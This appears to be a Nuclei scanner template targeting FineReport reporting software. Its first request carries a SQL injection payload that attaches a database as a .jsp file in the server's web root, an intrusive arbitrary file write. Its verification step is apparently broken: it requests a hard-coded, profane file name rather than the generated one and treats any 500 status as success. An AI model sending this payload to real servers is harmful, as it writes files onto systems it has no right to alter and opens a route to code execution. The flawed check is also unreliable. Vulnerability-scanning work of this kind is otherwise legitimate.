id: finereport-sqli-file-upload

info:
  name: FineReport Sqli File Upload
  author: adeljck
  severity: critical
  description: FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.
  metadata:
    max-request: 2
    fofa-query: app="帆软-FineReport"
  tags: finereport,fileupload,intrusive
variables:
  string: '{{rand_base(8, "abc")}}'
  filename: '{{rand_base(8)}}'
http:
  - raw:
      - |
        GET /webroot/decision/view/ReportServer?test=ssssss&n=${a=sql('FRDemo',DECODE('%ef%bb%bfattach%20database%20%27%2E%2E%2Fwebapps%2Fwebroot%2Fscripts%2Fjs%2F{{filename}}%2Ejsp%27%20as%20%27{{filename}}%27%3B'),1,1)} HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
      - |
        GET /webroot/scripts/js/fuckyou.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
    
    matchers-condition: and
    matchers:
      - type: status
        status: 
            - 500